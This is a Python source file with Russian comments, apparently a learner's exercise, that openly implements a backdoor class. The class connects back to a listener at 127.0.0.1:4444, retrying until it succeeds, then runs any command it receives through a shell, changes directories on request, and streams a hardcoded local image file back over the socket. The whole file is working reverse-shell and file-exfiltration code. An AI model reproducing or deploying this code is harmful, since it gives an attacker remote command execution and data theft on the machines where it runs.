#!/usr/bin/python
import socket
import subprocess as sb
import json
import os
import time
import base64


def execute_system_command(command):
    # Выполнение консольных команд
    return sb.check_output(command[0], shell=True)



class Backdoors:
    def __init__(self, ip, port):
        ff = 1
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                break
            except ConnectionRefusedError:
                time.sleep(2)
                ff += 1
                print(ff)
                continue

    def reliable_sehd(self, data):
        # Метод упаковки данных в json формат для точной передачи данных.
        json_data = json.dumps(data)  # Создаем переменую в которую будем упаковывать данные.
        self.connection.send(json_data.encode('utf-8'))  # Отправляем упакованые данные .

    def directory(self, path):
        # ПЕремещаемся по директориям.
        os.chdir(path)
        return f'[+] changing the current directory to {path}'

    def read_file(self):
        # Читаем содержимое файла.
        with open('/home/denis/Загрузки/frr.jpg', 'rb') as f:
            data = ''
            while data != b'':
                data = f.read(1024)
                self.connection.send(data)

    def reliable_recv(self):
        # Метод распаковки полученых данных.
        json_data = ''  # Создаем пустую переменую,для работы с ней в цикле.
        while True:  # Обьявляем бесконечный цикл.
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = self.reliable_recv()
            if command[0] == "exit":
                self.connection.close()  # Закываем соединение.
                exit()  # Закрываем программу.
            elif command[0] == 'cd' and len(command) > 1:  # Если команда CD И АРГУМЕНТ тогда переходим в нужную папку.
                command_result = self.directory(command[1])
            elif command[0] == 'download': # Команда на скачавание файла.
                self.read_file()
            else:
                command_result = execute_system_command(command)

            self.reliable_sehd(command_result)


my_backdoor = Backdoors('127.0.0.1', 4444)
my_backdoor.run()
